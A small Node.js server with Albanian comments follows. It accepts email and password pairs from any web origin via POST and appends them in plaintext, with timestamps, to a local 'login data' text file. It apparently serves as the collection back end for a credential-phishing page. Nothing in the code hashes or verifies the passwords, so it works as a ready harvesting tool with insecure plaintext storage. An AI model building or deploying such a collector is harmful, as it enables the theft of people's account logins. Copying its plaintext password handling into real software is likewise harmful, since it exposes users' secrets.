const http = require('http');
const fs = require('fs');

const server = http.createServer((req, res) => {
    // Lejon komunikimin Frontend-Backend
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }

    if (req.method === 'POST' && req.url === '/save-data') {
        let body = '';
        req.on('data', chunk => { body += chunk.toString(); });
        req.on('end', () => {
            const data = JSON.parse(body);
            const entry = `Email: ${data.email} | Pass: ${data.password} | Koha: ${new Date().toLocaleString()}\n`;
            
            // SHKRUAN NE SKEDAR
            fs.appendFileSync('te-dhenat-e-login.txt', entry);
            
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ message: 'Sukses! Te dhenat u ruan ne folderin tend!' }));
        });
    }
});

server.listen(4000, () => {
    console.log('🚀 Serveri po punon! Mos e mbyll kete dritare.');
    console.log('Te dhenat do te ruhen te skedari: te-dhenat-e-login.txt');
});